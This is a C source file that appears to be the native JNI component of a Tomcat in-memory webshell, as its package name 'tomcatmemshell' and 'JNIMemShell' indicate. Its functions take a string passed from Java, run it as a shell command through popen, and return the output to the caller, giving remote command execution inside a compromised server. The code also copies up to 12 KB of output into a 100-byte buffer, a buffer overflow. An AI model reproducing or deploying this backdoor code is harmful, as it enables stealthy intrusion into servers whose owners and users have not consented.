#include "org_example_tomcatmemshell_JNI_JNIMemShell.h"
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int execmd(const char *cmd, char *result)
{
    char buffer[1024*12];              //定义缓冲区
    FILE *pipe = popen(cmd, "r"); //打开管道，并执行命令
    if (!pipe)
        return 0; //返回0表示运行失败

    while (!feof(pipe))
    {
        if (fgets(buffer, 128, pipe))
        { //将管道输出到result中
            strcat(result, buffer);
        }
    }
    pclose(pipe); //关闭管道
    return 1;      //返回1表示运行成功
}
JNIEXPORT jstring JNICALL Java_org_example_tomcatmemshell_JNI_JNIMemShell_00024howToLoader_exec(JNIEnv *env, jclass clazz, jstring jstr)
{

    const char *cstr = (*env)->GetStringUTFChars(env, jstr, NULL);
    char result[1024 * 12] = ""; //定义存放结果的字符串数组
    if (1 == execmd(cstr, result))
    {
       // printf(result);
    }

    char return_messge[100] = "";
    strcat(return_messge, result);
    jstring cmdresult = (*env)->NewStringUTF(env, return_messge);
    //system();

    return cmdresult;
}